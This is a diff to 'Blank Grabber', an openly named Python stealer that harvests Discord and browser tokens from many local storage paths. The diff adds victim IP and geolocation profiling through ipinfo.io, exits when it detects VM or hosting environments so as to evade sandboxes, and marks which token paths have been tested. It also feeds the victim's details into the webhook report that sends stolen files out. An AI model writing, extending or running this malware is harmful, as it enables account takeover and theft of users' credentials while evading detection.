@@ -1,4 +1,6 @@
-"""https://github.com/Blank-c/Blank-Grabber"""
+"""https://github.com/Blank-c/Blank-Grabber
+
+I have marked "Checked" after the path of tokens that I have checked, for the remaining, I don't have those applications so I haven't checked them"""
 
 ##########################################
 
@@ -77,6 +79,26 @@ class Blank_Grabber:
         if token:
             headers.update({"Authorization": token})
         return headers
+
+    def ip_info(self):
+        headers={'referer': 'https://ipinfo.io/'}
+        for i in range(5):
+            r=requests.get('https://ipinfo.io/widget', headers=headers)
+            if r.status_code==200:
+                break
+        try:
+            r=r.json()
+        except json.decoder.JSONDecodeError:
+            r=requests.get('https://api.ipify.org').text
+            return f"IP: {r.text}"
+        if r['privacy'].get('hosting', True):
+            print('Have a nice day')
+            os._exit(1) #Using an online VM
+        try:
+            p=requests.get('https://blank-c.github.io/country-codes.json').json()
+        except Exception:
+            p={}
+        return f"IP: {r['ip']}\nRegion: {r['region']}\nCountry: {p.get(r['country'], r['country'])}\nTimezone: {r['timezone']}\n\n{'VPN:'.ljust(6)} {'✅' if r['privacy']['vpn'] else '❎'}\n{'Proxy:'.ljust(6)} {'✅' if r['privacy']['proxy'] else '❎'}\n{'Tor:'.ljust(6)} {'✅' if r['privacy']['tor'] else '❎'}\n{'Relay:'.ljust(6)} {'✅' if r['privacy']['relay'] else '❎'}"
         
     def bypass_better_discord(self):
         bd = os.getenv("appdata")+"/BetterDiscord/data/betterdiscord.asar"
@@ -223,7 +245,7 @@ class Blank_Grabber:
     def grabTokens(self):
         token=""
         paths = {
-            'Discord': self.roaming + r'/discord/Local Storage/leveldb/',
+            'Discord': self.roaming + r'/discord/Local Storage/leveldb/', #Checked
             'Discord Canary': self.roaming + r'/discordcanary/Local Storage/leveldb/',
             'Lightcord': self.roaming + r'/Lightcord/Local Storage/leveldb/',
             'Discord PTB': self.roaming + r'/discordptb/Local Storage/leveldb/',
@@ -238,7 +260,7 @@ class Blank_Grabber:
             'Sputnik': self.appdata + r'/Sputnik/Sputnik/User Data/Local Storage/leveldb/',
             'Vivaldi': self.appdata + r'/Vivaldi/User Data/Default/Local Storage/leveldb/',
             'Chrome SxS': self.appdata + r'/Google/Chrome SxS/User Data/Local Storage/leveldb/',
-            'Chrome': """I will take care of it myself""",
+            'Chrome': """I will take care of it myself""", #Checked
             'Epic Privacy Browser': self.appdata + r'/Epic Privacy Browser/User Data/Local Storage/leveldb/',
             'Microsoft Edge': self.appdata + r'/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',
             'Uran': self.appdata + r'/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',
@@ -313,12 +335,7 @@ class Blank_Grabber:
         image.save(self.tempfolder + "/Screenshot.png")
 
     def SendInfo(self):
-        ip = None
-        try:
-            ip = requests.get("https://api.ipify.org/").text
-        except Exception as e:
-            with open(self.logfile, 'a') as log:
-                log.write(f"Line {sys.exc_info()[2].tb_lineno} : {e.__class__.__name__} : {e}\n")
+        ip = self.ip_info()
         n=0
         for file in os.listdir(self.tempfolder):
             if os.path.isfile(os.path.abspath(os.path.join(self.tempfolder, file))):
@@ -336,7 +353,7 @@ class Blank_Grabber:
             "embeds": [
                 {
                     "title":"Blank Grabber",
-                    "description": f"```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nTotal Memory: {int((psutil.virtual_memory().total)/1073741824)+1}GB ({psutil.virtual_memory().percent}% used)```\n**{fileCount}**```fix\n{self.files}```",
+                    "description": f"```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nTotal Memory: {int((psutil.virtual_memory().total)/1073741824)+1}GB ({psutil.virtual_memory().percent}% used)\n\n{ip}```\n**{fileCount}**```fix\n{self.files}```",
                     "color": 16737536
                 }
             ]
@@ -367,7 +384,7 @@ if __name__=="__main__":
         print('Have a nice day')
         os._exit(1) #VM detection stage 1
     try:
-        r=requests.get("https://BlankGrabb.er/"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(5)]))
+        r=requests.get("https://BlankGrabb.er-"+"".join([(random.choice([chr(i) for i in range(97, 123)])) for i in range(5)]))
         print('Have a nice day')
         os._exit(1) #VM detection stage 2
     except requests.ConnectionError: pass
